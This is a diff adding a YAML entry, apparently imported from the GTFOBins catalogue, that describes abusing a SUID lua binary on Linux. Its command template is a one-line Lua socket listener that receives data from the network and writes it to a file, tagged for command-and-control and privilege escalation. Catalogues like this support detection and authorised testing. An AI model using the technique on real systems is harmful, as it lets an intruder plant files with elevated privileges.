@@ -1,0 +1,27 @@
+id: gtfobins/lua/download/suid
+type: binary
+platform: linux
+name: lua
+phases:
+- command-and-control
+- privilege-escalation
+capabilities:
+- file-download
+privilege_required: suid
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: "lua -e '\n  local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",12345));\n  local\
+    \ c=s:accept();\n  local d,x=c:receive(\"*a\");\n  c:close();\n  local f=io.open(\"/path/to/output-file\"\
+    , \"wb\");\n  f:write(d);\n  io.close(f);'"
+  comment: This requires `lua-socket` to be available.
+references:
+- https://gtfobins.github.io/gtfobins/lua/
+tags:
+- linux
+- unix
+- gtfobins
